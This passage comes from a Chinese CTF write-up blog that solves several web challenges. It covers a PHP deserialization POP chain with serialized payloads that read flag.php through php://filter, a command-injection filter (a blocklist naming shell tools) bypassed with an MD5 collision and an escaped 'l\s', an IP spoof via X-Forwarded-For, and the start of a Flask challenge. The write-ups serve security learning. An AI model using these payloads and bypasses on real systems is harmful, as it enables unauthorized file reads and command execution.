        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">//在preg_match的时候，会将对象转换为字符串，触发该对象的__toString方法。</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//在对象的外部获取私有成员属性的值时调用</span>
        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">p</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
Show<span class="token operator">.</span><span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span>Show<span class="token operator">.</span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span>Test<span class="token operator">.</span><span class="token function">__get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span>Modifier<span class="token operator">.</span><span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span>Modifier<span class="token operator">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span> <span class="token operator">?</span>php
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Modifier</span>
<span class="token punctuation">{</span>
    <span class="token keyword">protected</span> <span class="token variable">$var</span><span class="token operator">=</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">//Show.__wakeup()=&gt;Show.__toString()=&gt;Test.__get()=&gt;Modifier.__invoke()</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">;</span>
<span class="token variable">$d</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Modifier</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">-&gt;</span><span class="token property">p</span><span class="token operator">=</span><span class="token variable">$d</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">-&gt;</span><span class="token property">str</span><span class="token operator">=</span><span class="token variable">$c</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token property">source</span><span class="token operator">=</span><span class="token variable">$b</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//O:4:"Show":2:{s:6:"source";O:4:"Show":2:{s:6:"source";N;s:3:"str";O:4:"Test":1:{s:1:"p";O:8:"Modifier":1:{s:6:" * var";s:8:"flag.php";}}}s:3:"str";N;}</span>
<span class="token comment">//O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>在urlencode函数中，星号*不被编码</p>
</blockquote>
<p>所以就不用删除/加%00了~</p>
<p>但输入后看不见（</p>
<p>于是用伪协议</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token keyword">protected</span> <span class="token variable">$var</span><span class="token operator">=</span><span class="token string single-quoted-string">'php://filter/convert.base64-encode/resource=flag.php'</span><span class="token punctuation">;</span>

 <span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Show"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"source"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Show"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"source"</span><span class="token punctuation">;</span><span class="token constant">N</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"str"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Test"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"p"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Modifier"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">" * var"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">52</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"php://filter/convert.base64-encode/resource=flag.php"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"str"</span><span class="token punctuation">;</span><span class="token constant">N</span><span class="token punctuation">;</span><span class="token punctuation">}</span>

<span class="token operator">?</span>pop<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Show<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>source<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Show<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>source<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BN<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>str<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Test<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>p<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Modifier<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>var<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A52<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>php<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">2</span>Ffilter<span class="token operator">%</span><span class="token number">2</span>Fconvert<span class="token operator">.</span>base64<span class="token operator">-</span>encode<span class="token operator">%</span><span class="token number">2</span>Fresource<span class="token operator">%</span><span class="token number">3</span>Dflag<span class="token operator">.</span>php<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>Ds<span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>str<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BN<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/7daeda834e136fa2042cb8cc7c5fc444.png"></p>
<hr>
<h3 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h3><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/5a796ce1b04782f2d17aeb67a0e34a98.png"></p>
<p>有个cmd</p>
<p><code>;"()</code>等被forbid了（</p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/d02ca9ba5d6a9730b575650cd51a3fc4.png"></p>
<pre class="line-numbers language-none"><code class="language-none">flag.php
TmpZMll6WXhOamN5WlRjd05qZzNNQT09<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>17张牌你能秒我？（</p>
<pre class="line-numbers language-none"><code class="language-none">index.php
TmprMlpUWTBOalUzT0RKbE56QTJPRGN3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span> <span class="token operator">?</span>php
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token class-name">E_ALL</span> <span class="token operator">||</span> <span class="token operator">~</span> <span class="token constant">E_NOTICE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[^a-zA-Z0-9.]+/"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//过滤了所有非字母数字和点号</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src ="./ctf3.jpeg"&gt;'</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"xixi～ no flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;img src='data:image/gif;base64,"</span> <span class="token operator">.</span> <span class="token variable">$txt</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"'&gt;&lt;/img&gt;"</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">echo</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|&lt;|&gt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"forbid ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string backtick-quoted-string">`$cmd`</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"md5 is funny ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>html<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>style<span class="token operator">&gt;</span>
  body<span class="token punctuation">{</span>
   background<span class="token punctuation">:</span><span class="token function">url</span><span class="token punctuation">(</span><span class="token operator">.</span><span class="token operator">/</span>bj<span class="token operator">.</span>png<span class="token punctuation">)</span>  no<span class="token operator">-</span>repeat center center<span class="token punctuation">;</span>
   background<span class="token operator">-</span>size<span class="token punctuation">:</span>cover<span class="token punctuation">;</span>
   background<span class="token operator">-</span>attachment<span class="token punctuation">:</span>fixed<span class="token punctuation">;</span>
   background<span class="token operator">-</span>color<span class="token punctuation">:</span><span class="token comment">#CCCCCC;</span>
<span class="token punctuation">}</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>style<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>body<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">(string)$_POST['a'] !== (string)$_POST['b'] &amp;&amp; md5($_POST['a']) === md5($_POST['b'])<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>问一下小鲸鱼（</p>
<pre class="line-numbers language-none"><code class="language-none">$a = hex2bin('4dc968ff0ee20c95a107d9d9b7266d1edf769e0b166a237eaa6e7a75df06a0b916fca50eaa417218e8fec75d2d69bb1ee5a758a2ce5b0d5a61f9c735c5ac355');
$b = hex2bin('4dc968ff0ee20c95a107d9d9b7266d1edf769e0b166a237eaa6e7a75df06a0b916fca50eaa417218e8fec75d2d69bb1ee5a758a2ce5b0d5a61f9c735c5ac355');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>这两个二进制数据不同，但它们的 MD5 哈希值相同：</p>
<pre class="line-numbers language-none"><code class="language-none">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><code>l\s /</code></p>
<p>或者用dir也行<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_41905135/article/details/124881754">Windows系统命令dir使用详解_dir命令-CSDN博客</a></p>
<p><code>dir /</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/c70091c4c72ff7682b768c9e80aa5b7a.png"></p>
<hr>
<h3 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">  <span class="token keyword">function</span> <span class="token function-definition function">enc</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">{</span>
      hash <span class="token operator">=</span> <span class="token function">hex_md5</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> hash<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function-definition function">validate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token keyword">var</span> code <span class="token operator">=</span> document<span class="token operator">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"vcode"</span><span class="token punctuation">)</span><span class="token operator">.</span>value<span class="token punctuation">;</span>
<span class="token comment">//document 是 JavaScript 中表示整个 HTML 文档的对象，通过它可以访问和操作 HTML 文档中的各种元素。</span>
<span class="token comment">//getElementById() 是 document 对象的一个方法，用于根据元素的 id 属性来查找并返回对应的元素。</span>
<span class="token comment">//value 是 HTML 表单元素（如 &lt;input&gt;、&lt;textarea&gt;、&lt;select&gt; 等）的一个属性，用于获取或设置这些元素的值。所以，当对 document.getElementById("vcode") 返回的元素使用 .value 时，就可以得到该元素当前所包含的值。</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>code <span class="token operator">!=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">hex_md5</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"0cd4da0223c0b280829dc3ea458d655c"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
          <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"您通过了验证！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          window<span class="token operator">.</span>location <span class="token operator">=</span> <span class="token string double-quoted-string">"./flag.php"</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
          <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"你的授权码不正确！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"请输入授权码"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      
    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>发现输入框对应的id为vcode</p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/0b2ca3411cc6c5f6872c342bad8e30c7.png"></p>
<p>找个网站解一下<a target="_blank" rel="noopener" href="https://www.somd5.com/">MD5免费在线解密破解_MD5在线加密-SOMD5</a></p>
<pre class="line-numbers language-none"><code class="language-none">0cd4da0223c0b280829dc3ea458d655c
ARandomString<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<blockquote>
<p>把购买者的IP保存了</p>
</blockquote>
<p><code>X-Forwarded-For: 127.0.0.1</code></p>
<p>flag{bf368694-e93d-4ec1-ae3b-05c305f54eaa}</p>
<hr>
<h3 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> flask
<span class="token keyword">import</span> os

app <span class="token operator">=</span> flask<span class="token punctuation">.</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'FLAG'</span><span class="token punctuation">]</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'FLAG'</span><span class="token punctuation">)</span>
<span class="token comment">#从环境变量中获取 FLAG，并将其存储在 Flask 应用的配置中。os.environ.pop('FLAG') 会获取并移除环境变量中的 FLAG。</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
